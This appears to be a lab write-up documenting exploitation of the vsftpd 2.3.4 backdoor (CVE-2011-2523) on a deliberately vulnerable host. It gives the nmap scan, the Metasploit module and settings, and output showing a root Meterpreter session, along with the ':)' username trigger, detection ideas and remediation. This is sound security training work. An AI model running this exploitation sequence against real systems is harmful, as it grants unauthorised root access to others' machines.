---
layout: default
---
# vsftpd 2.3.4 Backdoor (CVE-2011-2523)

## Objective
Identify and exploit a known backdoor in a deliberately vulnerable FTP service.

## Method
Initial reconnaissance via Nmap service-version scan:
```nmap -sV 192.168.56.102```
Result flagged `vsftpd 2.3.4` on port 21 — a version with a publicly known, trojaned source release.

Exploitation via Metasploit:
use exploit/unix/ftp/vsftpd_234_backdoor
```set RHOSTS 192.168.56.102```
```set LHOST 192.168.56.101```
```run```
## Evidence
```[+] 192.168.56.102:21 - Backdoor has been spawned!```
```[*] Meterpreter session 1 opened```

```meterpreter > getuid```
```Server username: root```

![vsftpd backdoor root access](../images/01-vsftpd-getuid.png)

## Findings
- Unauthenticated remote root access via a backdoored FTP service binary
- No credentials, brute-forcing, or prior access required
- Full system compromise achieved in under a minute

## Detection Angle
The backdoor is triggered by a username containing `:)` sent to the FTP `USER` command. A detection rule could flag:
- Any FTP `USER` command containing non-standard characters
- Any connection attempt to port 6200 (the backdoor's listener port), since nothing legitimate should be listening there

## Remediation
- Never deploy vsftpd 2.3.4; verify checksums of any downloaded release against vendor-published hashes
- Monitor for unexpected listening ports following service installs
